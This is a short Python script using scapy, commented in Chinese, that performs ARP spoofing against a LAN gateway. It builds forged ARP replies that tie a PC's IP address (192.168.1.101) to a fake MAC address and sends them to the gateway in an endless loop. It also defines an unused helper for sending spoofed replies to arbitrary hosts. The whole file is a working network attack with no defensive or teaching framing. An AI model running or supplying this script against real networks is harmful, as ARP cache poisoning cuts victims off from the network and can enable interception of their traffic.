#coding:utf-8
'''
arp欺骗网关，将伪造的pc mac以pc的arp应答发送给网关
'''
from scapy.all import ARP,send,arping
import sys,re

gateway_ip='192.168.1.1'
gateway_hw='f0:eb:d0:0b:11:48'

my_ip='192.168.1.101'
#伪造pc mac地址
my_hw='00:11:22:33:44:55'

p=ARP(op = 2,hwsrc = my_hw,psrc = my_ip)

def arp_hack(ip,hw):
    #伪造来自网关的arp应答
    t=p
    t.hwdst=hw
    t.pdst=ip
    send(t)
 
if __name__ == "__main__":
    while 1:
        t=p
        t.hwdst=gateway_hw
        t.pdst=gateway_ip
        send(t)